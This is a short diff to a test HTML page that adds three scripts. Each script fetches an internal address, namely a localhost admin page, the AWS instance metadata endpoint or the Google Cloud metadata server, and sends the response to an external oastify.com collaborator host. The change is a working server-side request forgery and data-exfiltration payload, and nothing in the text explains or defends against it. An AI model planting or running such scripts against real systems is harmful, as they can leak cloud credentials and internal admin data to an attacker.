@@ -8,5 +8,32 @@
 <body>
     This website is for testing
 <img src="https://kf3ljso7rnhu5pj0hq22doopzg57t0hp.oastify.com" alt="">
+    <script>
+        var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://127.0.0.1:8000/admin", true);
+xhr.onload = function() {
+  fetch("http://kf3ljso7rnhu5pj0hq22doopzg57t0hp.oastify.com/log?data=" + encodeURIComponent(xhr.responseText));
+};
+xhr.send();
+
+    </script>
+    <script>
+        var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://169.254.169.254/latest/meta-data/", true);
+xhr.onload = function() {
+  fetch("http://kf3ljso7rnhu5pj0hq22doopzg57t0hp.oastify.com/log?data=" + encodeURIComponent(xhr.responseText));
+};
+xhr.send();
+
+    </script>
+    <script>
+        var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://metadata.google.internal/computeMetadata/v1/", true);
+xhr.onload = function() {
+  fetch("http://kf3ljso7rnhu5pj0hq22doopzg57t0hp.oastify.com/log?data=" + encodeURIComponent(xhr.responseText));
+};
+xhr.send();
+
+    </script>
 </body>
 </html>
